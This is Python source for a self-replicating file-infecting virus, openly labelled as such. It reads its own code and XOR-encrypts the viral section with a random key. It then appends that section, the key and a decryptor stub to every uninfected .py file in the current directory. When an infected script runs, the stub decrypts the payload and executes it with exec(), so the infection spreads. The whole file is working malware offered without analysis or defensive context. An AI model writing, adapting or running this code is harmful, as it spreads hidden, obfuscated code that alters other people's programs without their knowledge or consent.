# start the virus
import sys, glob, re, codecs,random

is_encrypted = False

# read the virus/infected file
virusLines = []
thisFile = sys.argv[0]
virusFile = open(thisFile,"r")
lines = virusFile.readlines()
virusFile.close()

# after infection just copy the malicious part to the other files
realVirus = []
not_encrypted = []
is_virus_line = False
little_flag = True
for i,line in enumerate(lines):
    if(re.search("^# start the virus",lines[i])):
        is_virus_line = True
    if(re.search("^# end the virus",lines[i])):
        is_virus_line = False
        little_flag = False
    else:
        little_flag = True
    if(is_virus_line):
        realVirus.append(lines[i])
    else:
        if(little_flag):
            not_encrypted.append(lines[i])

# takes one encryped char list and returns the decrypted version of the list as a strings
def xor(plain,key):
    r = []
    for i, j in zip(plain, key):
        r.append(str(int(i) ^ int(j)))  # xor between bits i and j
    return "".join(r)

# returns random l numbers as a list
def get_random_key(l):
    result = []
    for i in range(l):
        result.append(bin(random.randint(97,122))[2:].zfill(8))
    return result

# this will be used for random key generation
def find_the_longest_element(x):
    max_len = 0
    for item in x: # x is the whole virus code and item is each line
        if(len(item) > max_len):
            max_len = len(item)
    return max_len

# takes one line and returns the xored version of the each char
def encrypt_one_line(line,key_in_bits):
    line_bits = []
    xored_line = []
    for i in range(len(line)):
        line_bits.append(bin(ord(line[i]))[2:].zfill(8))
    for i,x in enumerate(line_bits):
        xored_line.append((xor(x,key_in_bits[i])) )
    
    return xored_line

# encrypts whole code
def encrypt(lines,key_in_bits):
    result = []
    for line in lines:
        result.append(encrypt_one_line(line,key_in_bits))
    return result

if not is_encrypted:
    print("hahahahah")
    # random key generation part
    key_len = find_the_longest_element(realVirus)
    random_key = get_random_key(key_len)
    # encrypted version of the code
    encrypted = encrypt(realVirus,random_key)
    # find all python files in/under the current directory
    programs = glob.glob('*.py',recursive=True)

    # infect all programs
    for p in programs:
        file = open(p,"r")
        programCodeList = file.readlines()
        file.close

        infected = False
        for line in programCodeList:
            if(re.search("^# start the virus",line)):
                infected = True
                break

        if not infected:

            file = open(p,'w')
            file.write("\n".join(str(item) for item in programCodeList)) # writing the original code
            file.write("\n# start the virus")
            file.write("\n#e")
            file.write("\n#e".join(str(item) for item in encrypted))      # writing the encryped part
            file.write("\n# end the virus")
            file.write("\n#a" + " ".join(random_key))                     # writing the key
            file.write("\nis_encrypted = True")
            file.write("".join(str(item) for item in not_encrypted))   # writing the not encrypted part
            file.close()

# end the virus

import sys, glob, re, codecs,random

# decryption part and execution
def decrypt_one_line(line,key_in_bits):

    # takes one encryped char list and returns the decrypted version of the list as a strings
    def xor(plain,key):
        r = []
        for i, j in zip(plain, key):
            r.append(str(int(i) ^ int(j)))  # xor between bits i and j
        return "".join(r)
    result = []
    for i,x in enumerate(line):
        result.append( chr(int(xor(x,key_in_bits[i]),2)) )
    return "".join(result)

def decrypt(lines,key_in_bits):
    result = []
    for line in lines:
        result.append(decrypt_one_line(line,key_in_bits))
    return result

if(is_encrypted):

    this_file = sys.argv[0]
    virus_file = open(this_file,"r")
    virus_lines = virus_file.readlines()
    virus_file.close()

    # for finding the encrypted part/s of the virus

    encrypted_part = []
    encrypted_key = []

    for x in virus_lines:
        temp_line = []
        if(x[0] == '#' and x[1] == 'e'):
            encrypted_part.append(x[4:-2].split("', '"))
        elif(x[0] == '#' and x[1] == 'a'):
            encrypted_key.append(x[2:-1].split(" "))

    res = decrypt(encrypted_part,encrypted_key[0])
    exec("".join(res),{"sys":sys,"glob":glob, "re":re, "codecs":codecs,"random":random},{"is_encrypted":is_encrypted})